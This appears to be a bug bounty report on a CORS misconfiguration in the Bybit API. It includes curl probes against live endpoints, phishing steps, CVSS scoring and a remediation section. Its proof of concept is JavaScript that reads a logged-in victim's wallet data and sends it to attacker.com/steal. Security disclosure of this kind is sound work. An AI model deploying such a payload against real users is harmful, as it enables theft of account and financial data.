# CORS Misconfiguration Leads to Account Takeover

## Summary
The Bybit API (api.bybit.com) contains a critical CORS misconfiguration that allows any external website to make authenticated cross-origin requests. The server reflects arbitrary Origin headers while also setting `Access-Control-Allow-Credentials: true`, enabling attackers to steal sensitive user data from logged-in Bybit users.

## Vulnerability Details

**Endpoint:** `https://api.bybit.com/*` (all endpoints affected)

**HTTP Response Headers:**
```
access-control-allow-origin: https://evil.com  ← Reflects attacker's origin
access-control-allow-credentials: true         ← Allows sending cookies
access-control-expose-headers: token, X-Signature
```

**Root Cause:** The server reflects the `Origin` header value directly into `Access-Control-Allow-Origin` without validation, combined with `Access-Control-Allow-Credentials: true`.

## Steps To Reproduce

### Step 1: Verify CORS Misconfiguration
```bash
curl -s -I "https://api.bybit.com/v5/market/time" -H "Origin: https://evil.com" | grep -i access-control
```

**Expected Output:**
```
access-control-allow-origin: https://evil.com
access-control-allow-credentials: true
access-control-expose-headers: token, X-Signature
```

### Step 2: Test on Authenticated Endpoint
```bash
curl -s -I "https://api.bybit.com/v5/user/query-api" \
    -H "Origin: https://attacker.com" \
    -H "X-BAPI-API-KEY: [ANY_KEY]" | grep -i access-control
```

Same vulnerable headers are returned.

### Step 3: Exploit PoC
Host the following HTML on any domain (e.g., attacker.com):

```html
<script>
fetch('https://api.bybit.com/v5/account/wallet-balance?accountType=UNIFIED', {
    credentials: 'include'  // Sends victim's session cookies
})
.then(r => r.json())
.then(data => {
    // Send stolen data to attacker's server
    fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
</script>
```

### Step 4: Social Engineering
1. Attacker sends link to victim (phishing email, forum post, etc.)
2. Victim (logged into Bybit) clicks link
3. Malicious page executes, stealing victim's:
   - Account balance
   - API key information  
   - Order history
   - Deposit addresses
   - Personal information

## Impact

### Data Exposure
An attacker can steal:
- **Wallet Balance** - `/v5/account/wallet-balance`
- **API Key Info** - `/v5/user/query-api` (may expose partial key data)
- **Order History** - `/v5/order/history`
- **Deposit Records** - `/v5/asset/deposit/query-record`
- **Personal Info** - `/v5/user/info`

### CVSS Score: 8.1 (High)
```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
```

| Metric | Value | Justification |
|--------|-------|---------------|
| Attack Vector | Network | Attacker hosts malicious web page |
| Attack Complexity | Low | Simple fetch() request |
| Privileges Required | None | No Bybit account needed |
| User Interaction | Required | Victim must visit page |
| Scope | Unchanged | Only affects Bybit |
| Confidentiality | High | Full account data exposed |
| Integrity | High | Potential for unauthorized actions |
| Availability | None | No service disruption |

## Remediation

### Recommended Fix
1. **Whitelist allowed origins** instead of reflecting the Origin header:
```
Access-Control-Allow-Origin: https://www.bybit.com
```

2. **Never combine** `Access-Control-Allow-Credentials: true` with a reflected or wildcard origin.

3. **Validate Origin header** against a strict whitelist:
```python
ALLOWED_ORIGINS = [
    'https://www.bybit.com',
    'https://app.bybit.com',
    'https://trade.bybit.com'
]

if request.headers.get('Origin') in ALLOWED_ORIGINS:
    response.headers['Access-Control-Allow-Origin'] = request.headers['Origin']
```

## Proof of Concept Files
- `CORS_EXPLOIT_POC.html` - Interactive demonstration page

## References
- [OWASP CORS Misconfiguration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
- [PortSwigger - Exploiting CORS](https://portswigger.net/web-security/cors)
- [HackerOne - CORS Bypass Reports](https://hackerone.com/reports/235200)

## Timeline
- **Discovered:** November 25, 2025
- **Reported:** [Current Date]

---

**Severity:** High  
**Weakness:** CWE-942: Permissive Cross-domain Policy with Untrusted Domains  
**Asset:** api.bybit.com
